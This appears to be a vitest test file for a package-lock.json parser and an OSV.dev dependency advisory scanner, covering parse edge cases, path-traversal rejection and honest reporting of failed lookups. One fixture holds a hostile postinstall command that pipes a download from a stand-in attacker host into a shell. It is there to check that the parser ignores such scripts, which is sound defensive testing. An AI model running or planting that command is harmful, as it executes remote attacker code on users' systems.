import { describe, it, expect, vi } from 'vitest';
import osvNext from './fixtures/osv-npm-next.json';
import { parseLockfile, packageNameFromPath, MAX_DEPENDENCIES } from '../src/lib/lockfile';
import { scanDependencies, DETAIL_LIMIT, type BatchFetcher, type DetailFetcher } from '../src/lib/dependency-scan';
import type { OsvVulnerability } from '../src/lib/osv';

const signal = () => new AbortController().signal;
const v3 = {
  name: 'app', lockfileVersion: 3,
  packages: {
    '': {name: 'app', version: '1.0.0', dependencies: {next: '^14.0.0'}},
    'node_modules/next': {version: '14.2.24'},
    'node_modules/@scope/pkg': {version: '2.1.0'},
    'node_modules/vitest': {version: '4.1.11', dev: true},
    'node_modules/next/node_modules/postcss': {version: '8.4.31'},
    'node_modules/linked': {link: true, resolved: 'packages/linked'},
    'node_modules/from-git': {version: 'github:owner/repo#abc', resolved: 'git+ssh://git@github.com/owner/repo.git'},
    'packages/workspace-a': {name: 'workspace-a', version: '0.0.1'},
  },
};
const v1 = {
  name: 'app', lockfileVersion: 1,
  dependencies: {
    next: {version: '14.2.24', dependencies: {postcss: {version: '8.4.31'}}},
    vitest: {version: '4.1.11', dev: true},
  },
};

describe('package-lock.json is read as data', () => {
  it('extracts direct, transitive, scoped and dev dependencies from lockfileVersion 3', () => {
    const parsed = parseLockfile(v3);
    expect(parsed.lockfileVersion).toBe(3);
    const names = parsed.dependencies.map(d => d.name + '@' + d.version);
    expect(names).toContain('next@14.2.24');
    expect(names).toContain('postcss@8.4.31');
    expect(names).toContain('@scope/pkg@2.1.0');
    expect(parsed.dependencies.find(d => d.name === 'vitest')?.dev).toBe(true);
    expect(parsed.dependencies.find(d => d.name === 'next')?.dev).toBe(false);
  });
  it('walks the nested tree of lockfileVersion 1', () => {
    const parsed = parseLockfile(v1);
    expect(parsed.lockfileVersion).toBe(1);
    expect(parsed.dependencies.map(d => d.name).sort()).toEqual(['next', 'postcss', 'vitest']);
    expect(parsed.dependencies.find(d => d.name === 'postcss')?.paths[0]).toBe('node_modules/next/node_modules/postcss');
  });
  it('skips entries with no exact published version instead of guessing one', () => {
    const parsed = parseLockfile(v3);
    expect(parsed.dependencies.map(d => d.name)).not.toContain('linked');
    expect(parsed.dependencies.map(d => d.name)).not.toContain('from-git');
    expect(parsed.skipped.reduce((sum, s) => sum + s.count, 0)).toBeGreaterThan(0);
    expect(parsed.skipped.map(s => s.reason).join(' ')).toContain('no exact published version');
  });
  it('records a package present at several paths once', () => {
    const parsed = parseLockfile({lockfileVersion: 3, packages: {
      '': {}, 'node_modules/a/node_modules/dup': {version: '1.0.0'}, 'node_modules/b/node_modules/dup': {version: '1.0.0'},
    }});
    const dup = parsed.dependencies.filter(d => d.name === 'dup');
    expect(dup).toHaveLength(1);
    expect(dup[0].paths).toHaveLength(2);
  });
  it('resolves the package name from the deepest node_modules segment', () => {
    expect(packageNameFromPath('node_modules/a/node_modules/@s/b')).toBe('@s/b');
    expect(packageNameFromPath('packages/workspace-a')).toBeNull();
    expect(packageNameFromPath('node_modules/../etc/passwd')).toBeNull();
  });
  it('ignores lifecycle scripts entirely rather than interpreting them', () => {
    const parsed = parseLockfile({lockfileVersion: 3, packages: {
      '': {}, 'node_modules/evil': {version: '1.0.0', scripts: {postinstall: 'curl https://attacker.example | sh'}, hasInstallScript: true},
    }});
    const entry = parsed.dependencies.find(d => d.name === 'evil')!;
    expect(entry).toBeDefined();
    expect(Object.keys(entry)).toEqual(['name', 'version', 'paths', 'dev']);
    expect(JSON.stringify(parsed)).not.toContain('attacker.example');
  });
  it('rejects documents that are not lockfiles', () => {
    expect(() => parseLockfile({name: 'app', dependencies: {next: '^14.0.0'}})).toThrow();
    expect(() => parseLockfile('not json object')).toThrow('not a package-lock.json');
  });
  it('caps the number of dependencies it will query and says so', () => {
    const packages: Record<string, unknown> = {'': {}};
    for (let i = 0; i < MAX_DEPENDENCIES + 40; i++) packages['node_modules/pkg' + i] = {version: '1.0.0'};
    const parsed = parseLockfile({lockfileVersion: 3, packages});
    expect(parsed.dependencies).toHaveLength(MAX_DEPENDENCIES);
    expect(parsed.truncated).toBe(true);
  });
});

describe('dependency advisory scan', () => {
  const vulns = (osvNext as {vulns: unknown[]}).vulns as OsvVulnerability[];
  const nextIds = vulns.map(v => v.id);
  const batchOk: BatchFetcher = vi.fn(async (targets: {ecosystem: 'npm'; name: string; version?: string}[]) => ({
    ok: true as const, pages: 1, truncated: false,
    data: targets.map(t => ({target: t, ids: t.name === 'next' ? nextIds : [], truncated: false})),
  }));
  const detailOk: DetailFetcher = vi.fn(async () => ({ok: true as const, data: vulns, pages: 1, truncated: false}));

  it('reports per-dependency findings with applicability for the installed version', async () => {
    const report = await scanDependencies(parseLockfile(v3), signal(), batchOk, detailOk);
    expect(report.source.status).toBe('ok');
    expect(report.counts.withAdvisories).toBe(1);
    const next = report.results.find(r => r.name === 'next')!;
    expect(next.version).toBe('14.2.24');
    expect(next.detailed).toBe(true);
    expect(next.findings.length).toBeGreaterThan(0);
    expect(next.findings.every(f => f.origin === 'live-lookup')).toBe(true);
    expect(report.results.map(r => r.name)).not.toContain('postcss');
  });

  it('never presents a failed batch lookup as a clean dependency tree', async () => {
    const failing: BatchFetcher = vi.fn(async () => ({ok: false as const, error: 'OSV.dev rate limit reached. The lookup did not complete.', retryable: true}));
    const report = await scanDependencies(parseLockfile(v3), signal(), failing, detailOk);
    expect(report.source.status).toBe('failed');
    expect(report.complete).toBe(false);
    expect(report.results).toEqual([]);
    expect(report.counts.queried).toBe(0);
    expect(report.limitations.join(' ')).toContain('must not be read as an absence of advisories');
    expect(report.source.detail).not.toMatch(/no (known )?vulnerabilit/i);
  });

  it('degrades to identifiers only when the per-package detail limit is reached', async () => {
    const packages: Record<string, unknown> = {'': {}};
    for (let i = 0; i < DETAIL_LIMIT + 5; i++) packages['node_modules/pkg' + i] = {version: '1.0.0'};
    const everything: BatchFetcher = vi.fn(async (targets: {ecosystem: 'npm'; name: string; version?: string}[]) => ({
      ok: true as const, pages: 1, truncated: false,
      data: targets.map(t => ({target: t, ids: ['GHSA-aaaa-bbbb-cccc'], truncated: false})),
    }));
    const noDetail: DetailFetcher = vi.fn(async () => ({ok: true as const, data: [], pages: 1, truncated: false}));
    const report = await scanDependencies(parseLockfile({lockfileVersion: 3, packages}), signal(), everything, noDetail);
    expect(report.detailLimitReached).toBe(true);
    expect(report.complete).toBe(false);
    expect(noDetail).toHaveBeenCalledTimes(DETAIL_LIMIT);
    expect(report.results.filter(r => !r.detailed).length).toBeGreaterThan(0);
    expect(report.limitations.join(' ')).toContain('identifiers only');
  });

  it('keeps a detail-fetch failure visible instead of reporting the package as clean', async () => {
    const failingDetail: DetailFetcher = vi.fn(async () => ({ok: false as const, error: 'timeout', retryable: true}));
    const report = await scanDependencies(parseLockfile(v3), signal(), batchOk, failingDetail);
    expect(report.complete).toBe(false);
    expect(report.limitations.join(' ')).toContain('could not be retrieved');
    const next = report.results.find(r => r.name === 'next')!;
    expect(next.advisoryIds.length).toBeGreaterThan(0);
    expect(next.detailed).toBe(false);
  });

  it('always states that a lockfile check is not a review of the application', async () => {
    const report = await scanDependencies(parseLockfile(v3), signal(), batchOk, detailOk);
    expect(report.limitations.join(' ')).toContain('does not analyse your own code');
    expect(report.limitations.join(' ')).toContain('is not proven safe');
    expect(report.limitations.join(' ')).toContain('different release branches');
  });
});
